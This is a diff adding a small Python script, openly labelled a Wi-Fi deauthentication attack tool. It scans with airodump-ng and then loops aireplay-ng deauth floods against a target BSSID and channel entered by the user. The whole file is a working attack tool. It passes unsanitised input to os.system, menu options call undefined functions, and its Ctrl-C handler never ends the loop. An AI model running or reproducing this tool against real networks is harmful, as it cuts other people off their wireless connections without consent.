@@ -1,0 +1,63 @@
+import os, sys, time
+
+#########################################
+def menu():
+    os.system("clear")
+    print("              *******************************")
+    print("              *  Wifi Deauth Attack Script  *")
+    print("              *******************************")
+    print()
+    print()
+    print("              1.Deauth Unlimited Time")
+    print("              2.Deauth Linited Time.          coming soon.")
+    print("              3.Deauth The Client Only.       coming soon.")
+    print()
+    print()
+
+###########################################
+
+def option():
+    opt=input("[ + ] Select The Typo : ")
+    if opt =='1':
+       print("")
+       ut()
+    elif opt=='2':
+         lt()
+    elif opt=='3':
+         co()
+    else:
+         restart()
+
+############################################
+
+def restart():
+    menu()
+    option()
+
+############################################
+
+def ut():
+    print()
+  
+    intf=input("[ + ] Enter the Wifi Interface | Adapter Name : ")
+    os.system("airodump-ng "+intf)
+    print()
+    print("Copy The Channel And BSSID...")
+    time.sleep(2)
+    os.system("clear")
+    print("")
+    targetu=input("[ + ] Enter The Target's BSSID : ")
+    chn=input("[ + ] Enter The Target's Channel : ")
+    print()
+    input("Enter To Start Attack....")
+    while True:
+          try:
+              os.system("airmon-ng start "+intf+" "+chn)
+              os.system("aireplay-ng --deauth 1000 -a "+targetu+" "+intf)
+          except KeyboardInterrupt:
+                                  os.system("clear")
+                                  print("Process Ended")
+
+###########################################
+menu()
+option()
